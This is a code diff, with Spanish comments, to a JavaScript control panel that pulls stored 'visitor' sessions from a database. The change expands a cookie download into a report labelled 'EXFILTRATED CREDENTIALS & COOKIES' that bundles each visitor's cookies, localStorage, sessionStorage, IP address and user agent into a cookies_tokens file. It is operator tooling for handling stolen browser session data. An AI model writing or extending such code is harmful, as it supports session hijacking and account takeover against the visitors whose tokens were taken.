@@ -210,7 +210,7 @@ function downloadDeviceData(sessionId) {
     .catch(err => { console.error(err); showMsg('Error al descargar datos.', true); });
 }
 
-// Descargar solo cookies de un dispositivo
+// Descregar reporte completo de Almacenamiento (Cookies, LocalStorage, SessionStorage)
 function downloadCookies(sessionId) {
   if (!sessionId) return;
   const ref = db.ref('visitors/' + sessionId);
@@ -218,12 +218,37 @@ function downloadCookies(sessionId) {
     .then(snap => {
       const data = snap.val();
       if (!data) { showMsg('No se encontraron datos para la sesión.', true); return; }
-      const cookies = data.cookies || '';
-      const blob = new Blob([cookies], { type: 'text/plain' });
+      
+      let content = `=====================================================\n`;
+      content += `   CYBERFORENSIC EXFILTRATED CREDENTIALS & COOKIES   \n`;
+      content += `=====================================================\n`;
+      content += `Session ID: ${data.sessionId || sessionId}\n`;
+      content += `Timestamp:  ${data.timestamp || 'N/A'}\n`;
+      content += `IP Pública: ${data.ip || 'N/A'}\n`;
+      content += `User-Agent: ${data.userAgent || 'N/A'}\n\n`;
+
+      content += `--- [ 1. COOKIES ] ---\n`;
+      content += (data.cookies && data.cookies !== '') ? `${data.cookies}\n\n` : `[Sin cookies document.cookie directas o HTTPOnly activas]\n\n`;
+
+      content += `--- [ 2. LOCAL STORAGE ] ---\n`;
+      if (data.localStorage && Object.keys(data.localStorage).length > 0) {
+        content += JSON.stringify(data.localStorage, null, 2) + `\n\n`;
+      } else {
+        content += `[LocalStorage Vacío]\n\n`;
+      }
+
+      content += `--- [ 3. SESSION STORAGE ] ---\n`;
+      if (data.sessionStorage && Object.keys(data.sessionStorage).length > 0) {
+        content += JSON.stringify(data.sessionStorage, null, 2) + `\n\n`;
+      } else {
+        content += `[SessionStorage Vacío]\n\n`;
+      }
+
+      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `cookies_${sessionId}.txt`;
+      a.download = `cookies_tokens_${sessionId}.txt`;
       document.body.appendChild(a);
       a.click();
       setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
